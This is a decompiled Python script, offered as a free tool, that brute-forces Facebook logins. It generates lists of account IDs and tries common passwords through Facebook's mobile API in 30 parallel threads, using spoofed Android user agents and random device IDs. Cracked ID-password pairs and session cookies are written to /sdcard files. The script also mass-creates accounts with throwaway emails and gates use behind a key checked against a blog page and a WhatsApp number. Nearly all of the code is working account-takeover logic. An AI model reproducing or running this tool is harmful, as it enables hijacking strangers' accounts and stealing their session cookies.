""
'//DECOMPILED BY OUSSAMA'
'FACEBOOK : MOHAMED OUSSAMA SEBTI'
''
...
logo=(f"""\033[1;37m
            dP"Yb  88   88 .dP"Y8 .dP"Y8    db    8b    d8    db    
dP   Yb 88   88 `Ybo." `Ybo."   dPYb   88b  d88   dPYb   
Yb   dP Y8   8P o.`Y8b o.`Y8b  dP__Yb  88YbdP88  dP__Yb  
 YbodP  `YbodP' 8bodP' 8bodP' dP""""Yb 88 YY 88 dP""""Yb
 ...
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : OUSSAMA SABTI
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mGithub  : oussamasabti
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mService : Free
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 0,01
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in OUSSAMA folder
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome OUSSAMA SEBTI Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print(" \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mOUSSAMA Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
...
def pak():
                ...
                with tred(max_workers=30) as OUSSAMA:     
                        ...
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SEBTI:     
                        clear()
...
def ind():
                ...
                with tred(max_workers=30) as MUGHAL:     
                        ...
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m OUSSAMA Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [OUSSAMA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[[FBAN/FB4A;FBAV/189.91.28.15;FBBV/88519031;FBDM/{density=3.0,width=1009,height=2032};FBLC/en_US;FBRV/98574898;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/197.81.85.99;FBBV/53473758;FBDM/{density=1.3,width=1255,height=1726};FBLC/en_US;FBRV/79821065;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/9.7;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [OUSSAMA -OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/OUSSAMA/SEBTI-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [OUSSAMA-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/OUSSAMA/SEBTI-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/OUSSAMA/SEBTI-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [OUSSAMA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/173.60.41.12;FBBV/31321407;FBDM/{density=3.4,width=905,height=1593};FBLC/en_US;FBRV/47354873;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/7.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/109.31.19.45;FBBV/74059997;FBDM/{density=2.3,width=1380,height=1417};FBLC/en_US;FBRV/43187512;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/7.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SEBTI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     
                                        open('/sdcard/OUSSAMA/SEBTI-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/OUSSAMA/SEBTI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [XB-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/OUSSAMA/SEBTI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [OUSSAMA-OK] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/134.49.3.39;FBBV/35745987;FBDM/{density=1.6,width=1335,height=1487};FBLC/en_US;FBRV/73122421;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/7.7;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/124.82.89.60;FBBV/99735282;FBDM/{density=2.1,width=1375,height=1435};FBLC/en_US;FBRV/91818448;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/9.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [OUSSAMA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/OUSSAMA/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/OUSSAMA/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [OUSSAMA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/OUSSAMA/SEBTI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [OUSSAMA-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
...
def main_apv():
    ...
    try:
        ...
        input(' Exit And Again Run The Command');os.system('python oussama.py')
        tks = ('Hello%20oussama%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)

    r1 = requests.get('https://oussamasabti.blogspot.com/2023/11/2023nov.html?m=1').text
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20SEBTI%20Owner%20OUSSAMA-XB%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213782667310?text='+tks)
        menu()
menu()
